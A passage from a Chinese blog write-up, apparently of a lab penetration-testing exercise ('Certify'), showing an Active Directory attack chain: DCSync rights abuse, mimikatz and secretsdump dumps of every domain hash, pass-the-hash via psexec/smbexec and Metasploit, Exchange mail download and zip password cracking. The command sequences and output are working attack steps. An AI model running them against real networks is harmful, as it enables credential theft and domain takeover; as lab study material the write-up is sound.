class="hljs-string">&quot;DC=xiaorang,DC=lab&quot;</span> <span class="hljs-literal">-dc-ip</span> <span class="hljs-number">172.22</span>.<span class="hljs-number">3.2</span><br>proxychains impacket<span class="hljs-literal">-dacledit</span> xiaorang.lab/XIAORANG<span class="hljs-literal">-EXC01</span>\<span class="hljs-variable">$</span> <span class="hljs-literal">-hashes</span> :<span class="hljs-number">766</span>a276a053f370d92eaf25c243f1124 <span class="hljs-literal">-action</span> <span class="hljs-built_in">write</span> <span class="hljs-literal">-rights</span> DCSync <span class="hljs-literal">-principal</span> Zhangtong <span class="hljs-literal">-target-dn</span> <span class="hljs-string">&quot;DC=xiaorang,DC=lab&quot;</span> <span class="hljs-literal">-dc-ip</span> <span class="hljs-number">172.22</span>.<span class="hljs-number">3.2</span><br></code></pre></td></tr></table></figure>
+
+<p>接下来我们就可以利用dcsync去dump域管的hash了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs 成功">impacket-psexec 命令执行<br>.\mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; exit<br><br># 或者msf<br>load kiwi<br>kiwi_cmd &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; exit<br><br>meterpreter &gt; kiwi_cmd &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; exit<br>[DC] &#x27;xiaorang.lab&#x27; will be the domain<br>[DC] &#x27;XIAORANG-WIN16.xiaorang.lab&#x27; will be the DC server<br>[DC] Exporting domain &#x27;xiaorang.lab&#x27;<br>[rpc] Service  : ldap<br>[rpc] AuthnSvc : GSS_NEGOTIATE (9)<br>502     krbtgt  b8fa79a52e918cb0cbcd1c0ede492647        514<br>1137    HealthMailboxeda7a84    1e89e23e265bb7b54dc87938b1b1a131        66048<br>1138    HealthMailbox33b01cf    0eff3de35019c2ee10b68f48941ac50d        66048<br>1139    HealthMailbox9570292    e434c7db0f0a09de83f3d7df25ec2d2f        66048<br>1140    HealthMailbox3479a75    c43965ecaa92be22c918e2604e7fbea0        66048<br>1141    HealthMailbox2d45c5b    4822b67394d6d93980f8e681c452be21        66048<br>1142    HealthMailboxec2d542    147734fa059848c67553dc663782e899        66048<br>1143    HealthMailboxf5f7dbd    e7e4f69b43b92fb37d8e9b20848e6b66        66048<br>1144    HealthMailbox67dc103    4fe68d094e3e797cfc4097e5cca772eb        66048<br>1145    HealthMailbox320fc73    0c3d5e9fa0b8e7a830fcf5acaebe2102        66048<br>1146    Lumia   862976f8b23c13529c2fb1428e710296        512<br>500     Administrator   7acbc09a6c0efd81bfa7d5a1d4238beb        512<br>1000    XIAORANG-WIN16$ f4e293923315dbf505c2e33aefc92cca        532480<br>1147    Zhangtong       22c7f81993e96ac83ac2f3f1903de8b4        512<br>1103    XIAORANG-EXC01$ 766a276a053f370d92eaf25c243f1124        4096<br>1104    XIAORANG-PC$    57945839978ad251d75c5a8f4196472a        4096<br>1135    HealthMailbox8446c5b    42f51f9c4b7e0cd90f4c34fea8a202d8        66048<br>1136    HealthMailbox0d5918e    36f432a5d2b2754167986ee5973d003f        66048<br><br>mimikatz(powershell) # exit<br>Bye!<br><br># 或者<br>proxychains4 impacket-secretsdump xiaorang.lab/Zhangtong@172.22.3.2 -hashes :22c7f81993e96ac83ac2f3f1903de8b4 -just-dc-ntlm<br>proxychains4 impacket-secretsdump xiaorang.lab/Zhangtong@172.22.3.2 -hashes :22c7f81993e96ac83ac2f3f1903de8b4 -just-dc-ntlm<br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.17<br>[proxychains] DLL init: proxychains-ng 4.17<br>[proxychains] DLL init: proxychains-ng 4.17<br>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies <br><br>[proxychains] Strict chain  ...  127.0.0.1:55556  ...  172.22.3.2:445  ...  OK<br>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)<br>[*] Using the DRSUAPI method to get NTDS.DIT secrets<br>[proxychains] Strict chain  ...  127.0.0.1:55556  ...  172.22.3.2:135  ...  OK<br>[proxychains] Strict chain  ...  127.0.0.1:55556  ...  172.22.3.2:49667  ...  OK<br>xiaorang.lab\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7acbc09a6c0efd81bfa7d5a1d4238beb:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b8fa79a52e918cb0cbcd1c0ede492647:::<br>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>xiaorang.lab\$431000-7AGO1IPPEUGJ:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>xiaorang.lab\SM_46bc0bcd781047eba:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>xiaorang.lab\SM_2554056e362e45ba9:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>xiaorang.lab\SM_ae8e35b0ca3e41718:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>xiaorang.lab\SM_341e33a8ba4d46c19:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>xiaorang.lab\SM_3d52038e2394452f8:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>xiaorang.lab\SM_2ddd7a0d26c84e7cb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>xiaorang.lab\SM_015b052ab8324b3fa:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>xiaorang.lab\SM_9bd6f16aa25343e68:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>xiaorang.lab\SM_68af2c4169b54d459:1133:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>xiaorang.lab\HealthMailbox8446c5b:1135:aad3b435b51404eeaad3b435b51404ee:42f51f9c4b7e0cd90f4c34fea8a202d8:::<br>xiaorang.lab\HealthMailbox0d5918e:1136:aad3b435b51404eeaad3b435b51404ee:36f432a5d2b2754167986ee5973d003f:::<br>xiaorang.lab\HealthMailboxeda7a84:1137:aad3b435b51404eeaad3b435b51404ee:1e89e23e265bb7b54dc87938b1b1a131:::<br>xiaorang.lab\HealthMailbox33b01cf:1138:aad3b435b51404eeaad3b435b51404ee:0eff3de35019c2ee10b68f48941ac50d:::<br>xiaorang.lab\HealthMailbox9570292:1139:aad3b435b51404eeaad3b435b51404ee:e434c7db0f0a09de83f3d7df25ec2d2f:::<br>xiaorang.lab\HealthMailbox3479a75:1140:aad3b435b51404eeaad3b435b51404ee:c43965ecaa92be22c918e2604e7fbea0:::<br>xiaorang.lab\HealthMailbox2d45c5b:1141:aad3b435b51404eeaad3b435b51404ee:4822b67394d6d93980f8e681c452be21:::<br>xiaorang.lab\HealthMailboxec2d542:1142:aad3b435b51404eeaad3b435b51404ee:147734fa059848c67553dc663782e899:::<br>xiaorang.lab\HealthMailboxf5f7dbd:1143:aad3b435b51404eeaad3b435b51404ee:e7e4f69b43b92fb37d8e9b20848e6b66:::<br>xiaorang.lab\HealthMailbox67dc103:1144:aad3b435b51404eeaad3b435b51404ee:4fe68d094e3e797cfc4097e5cca772eb:::<br>xiaorang.lab\HealthMailbox320fc73:1145:aad3b435b51404eeaad3b435b51404ee:0c3d5e9fa0b8e7a830fcf5acaebe2102:::<br>xiaorang.lab\Lumia:1146:aad3b435b51404eeaad3b435b51404ee:862976f8b23c13529c2fb1428e710296:::<br>Zhangtong:1147:aad3b435b51404eeaad3b435b51404ee:22c7f81993e96ac83ac2f3f1903de8b4:::<br>XIAORANG-WIN16$:1000:aad3b435b51404eeaad3b435b51404ee:f4e293923315dbf505c2e33aefc92cca:::<br>XIAORANG-EXC01$:1103:aad3b435b51404eeaad3b435b51404ee:766a276a053f370d92eaf25c243f1124:::<br>XIAORANG-PC$:1104:aad3b435b51404eeaad3b435b51404ee:57945839978ad251d75c5a8f4196472a:::<br>[*] Cleaning up... <br>                      <br></code></pre></td></tr></table></figure>
+
+<p>拿到域管hash，那我们接下来就可以随意横向了</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs livescript">proxychains impacket-psexec administrator@<span class="hljs-number">172.22</span>.<span class="hljs-number">3.2</span> -hashes <span class="hljs-string">&#x27;:7acbc09a6c0efd81bfa7d5a1d4238beb&#x27;</span> -codec gbk<br><span class="hljs-comment"># 或者</span><br>use exploit/windows/smb/psexec<br>set RHOSTS <span class="hljs-number">172.22</span>.<span class="hljs-number">3.2</span><br>set SMBUser administrator<br>set SMBPass <span class="hljs-number">00000000000000000000000000000000</span>:<span class="hljs-number">7acbc</span>09a6c0efd81bfa7d5a1d4238beb<br>set SMBDomain xiaorang.lab<br>set PAYLOAD windows/x64/meterpreter/bind_tcp<br>set LPORT <span class="hljs-number">54526</span><br>run<br><br><span class="hljs-comment"># 拿flag</span><br>type c:<span class="hljs-string">\Users\Administrator\flag\flag.txt</span><br>____  ___.___   _____   ________ __________    _____    _______    ________ <br><span class="hljs-string">\</span>   <span class="hljs-string">\/</span>  <span class="hljs-regexp">/|   | /</span>  _  <span class="hljs-string">\</span>  <span class="hljs-string">\_____</span>  <span class="hljs-string">\\______</span>   <span class="hljs-string">\</span>  /  _  <span class="hljs-string">\</span>   <span class="hljs-string">\</span>      <span class="hljs-string">\</span>  /  _____/ <br> <span class="hljs-string">\</span>     / |   |/  <span class="hljs-regexp">/_\  \  /</span>   |   <span class="hljs-string">\|</span>       _/ /  <span class="hljs-regexp">/_\  \  /</span>   |   <span class="hljs-string">\/</span>   <span class="hljs-string">\</span>  ___ <br> /     <span class="hljs-string">\</span> |   /    |    <span class="hljs-string">\/</span>    |    <span class="hljs-string">\</span>    |   <span class="hljs-string">\/</span>    |    <span class="hljs-string">\/</span>    |    <span class="hljs-string">\</span>    <span class="hljs-string">\_\</span>  <span class="hljs-string">\</span><br><span class="hljs-regexp">/___/</span><span class="hljs-string">\</span>  <span class="hljs-string">\|___\____|__</span>  <span class="hljs-regexp">/\_______  /____|_  /</span><span class="hljs-string">\____|__</span>  <span class="hljs-regexp">/\____|__  /</span><span class="hljs-string">\______</span>  /<br>      <span class="hljs-string">\_/</span>            <span class="hljs-string">\/</span>         <span class="hljs-string">\/</span>       <span class="hljs-string">\/</span>         <span class="hljs-string">\/</span>         <span class="hljs-string">\/</span>        <span class="hljs-string">\/</span> <br><br>flag04: flag&#123;<span class="hljs-number">6aecb</span>4b9-<span class="hljs-number">02a</span>1-<span class="hljs-number">45be</span>-bdfd-e1d7db8d6de8&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h1><p>还剩一个flag，应该在26那台机器上</p>
+<p>接下来横向去26拿flag3</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains4</span> impacket-smbclient -hashes :<span class="hljs-number">7</span>acbc09a6c0efd81bfa7d5a1d4238beb xiaorang.lab/administrator@<span class="hljs-number">172.22.3.26</span> -dc-ip <span class="hljs-number">172.22.3.2</span><br><br><span class="hljs-attribute">use</span> C$<br><span class="hljs-attribute">cd</span> /users/lumia/desktop<br></code></pre></td></tr></table></figure>
+
+<p>psexec去PTH失败了，smbexec可以</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 不行</span><br>proxychains4 impacket-psexec xiaorang.lab/administrator@172.22.3.26 -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb -dc-ip 172.22.3.2 -<span class="hljs-built_in">debug</span><br>-codec gbk、-codec<span class="hljs-built_in"> default </span>或 -debug都不行<br><span class="hljs-comment"># 也不行</span><br>use exploit/windows/smb/smbexec<br><span class="hljs-built_in">set</span> RHOSTS 172.22.3.26<br><span class="hljs-built_in">set</span> SMBUser administrator<br><span class="hljs-built_in">set</span> SMBPass 00000000000000000000000000000000:7acbc09a6c0efd81bfa7d5a1d4238beb<br><span class="hljs-built_in">set</span> SMBDomain xiaorang.lab<br><span class="hljs-built_in">set</span> PAYLOAD windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> LPORT 54528<br><span class="hljs-built_in">run</span><br><br><span class="hljs-comment"># 这个可以</span><br>proxychains4 impacket-smbexec -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb xiaorang.lab/administrator@172.22.3.26 -codec gbk<br></code></pre></td></tr></table></figure>
+
+<p>impacket-psexec和 impacket-smbexec虽然都能用 hash 登录 Windows，但实现原理不同：</p>
+<ul>
+<li><strong>psexec</strong> 用的是在目标主机上创建服务（需要能写入 ADMIN$ 共享，且目标主机策略允许），有些环境（如安全策略、杀软、端口策略）会阻止新服务创建或 ADMIN$ 写入。</li>
+<li><strong>smbexec</strong> 用的是远程调用命令，不需要在目标上新建服务，权限和策略要求低，兼容性好。</li>
+</ul>
+<p>在<code>C:\users\lumia\desktop</code>找到一个secret.zip，我们把它get下来</p>
+<p>secret.zip里面有个flag.docx，但是secret.zip需要密码</p>
+<h2 id="dump邮件"><a href="#dump邮件" class="headerlink" title="dump邮件"></a>dump邮件</h2><p>这里要利用第二次拿到的lumia的hash，将outlook中的邮件下载下来</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># 使用这个工具dump邮件</span><br>git clone https:<span class="hljs-string">//github.com/Jumbo-WJB/PTH_Exchange.git</span><br><br>proxychains4 python3 pthexchange.py <span class="hljs-params">--target</span> https:<span class="hljs-string">//172.22.3.9</span> <span class="hljs-params">--username</span> Lumia <span class="hljs-params">--password</span> <span class="hljs-string">&quot;00000000000000000000000000000000:862976f8b23c13529c2fb1428e710296&quot;</span> <span class="hljs-params">--action</span> Download<br></code></pre></td></tr></table></figure>
+
+<p>拿到两封邮件（可以用网易邮箱打开）：</p>
+<p>第一封附件是刚刚的secret.zip，提示说用手机号解密；</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152208701.png" srcset="/img/loading.gif" lazyload alt="image-20250816033101255"></p>
+<p>第二封邮件中附件是一堆名字和手机号</p>
+<h2 id="字典爆破"><a href="#字典爆破" class="headerlink" title="字典爆破"></a>字典爆破</h2><p>我们用手机号作为字典进行爆破</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cat item-1-phone\ lists.csv | grep -Po <span class="hljs-string">&#x27;,\d+&#x27;</span> | sed <span class="hljs-string">&#x27;s/,//&#x27;</span> &gt; num.txt<br>zip2john item-0-secret.zip &gt;aaa<br>john<span class="hljs-built_in"> aaa </span><span class="hljs-attribute">--wordlist</span>=num.txt<br><br><br><span class="hljs-comment"># 结果如下</span><br>┌──(matrix㉿matrix)-[~/Desktop/PTH_Exchange/output]<br>└─$ cat item-1-phone\ lists.csv | grep -Po <span class="hljs-string">&#x27;,\d+&#x27;</span> | sed <span class="hljs-string">&#x27;s/,//&#x27;</span> &gt; num.txt                                   <br>┌──(matrix㉿matrix)-[~/Desktop/PTH_Exchange/output]<br>└─$ zip2john item-0-secret.zip &gt;aaa<br>ver 2.0 item-0-secret.zip/flag.docx PKZIP Encr: <span class="hljs-attribute">cmplen</span>=668284, <span class="hljs-attribute">decmplen</span>=671056, <span class="hljs-attribute">crc</span>=AFEF0968 <span class="hljs-attribute">ts</span>=AB91 <span class="hljs-attribute">cs</span>=afef <span class="hljs-attribute">type</span>=8                                   <br>┌──(matrix㉿matrix)-[~/Desktop/PTH_Exchange/output]<br>└─$ john<span class="hljs-built_in"> aaa </span><span class="hljs-attribute">--wordlist</span>=num.txt<br>Using<span class="hljs-built_in"> default </span>input encoding: UTF-8<br>Loaded 1 password hash (PKZIP [32/64])<br>Will <span class="hljs-built_in">run</span> 4 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> <span class="hljs-keyword">or</span> Ctrl-C <span class="hljs-keyword">to</span> abort, almost any other key <span class="hljs-keyword">for</span> status<br>18763918468      (item-0-secret.zip/flag.docx)     <br>1g 0:00:00:00 DONE (2025-08-16 00:13) 100.0g/s 50000p/s 50000c/s 50000C/s 15265180637<span class="hljs-built_in">..</span>15989600577<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option <span class="hljs-keyword">to</span> display all of the cracked passwords reliably<br>Session completed. <br><br></code></pre></td></tr></table></figure>
+
+<p>爆出密码是<code>18763918468</code>，解压缩，拿到flag</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152209949.png" srcset="/img/loading.gif" lazyload alt="image-20250816001511953"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/PenTest/" class="category-chain-item">PenTest</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" class="print-no-link">#春秋云镜</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>春秋云境 Certify</div>
+      <div>http://example.com/2026/test51/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>sangnigege</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月15日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/test52/" title="春秋云镜 Delegation">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">春秋云镜 Delegation</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/test50/" title="春秋云镜 Certify">
+                        <span class="hidden-mobile">春秋云镜 Certify</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","appKey":"rSHs3EnI9lT7nQwv5J7fcBnq","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
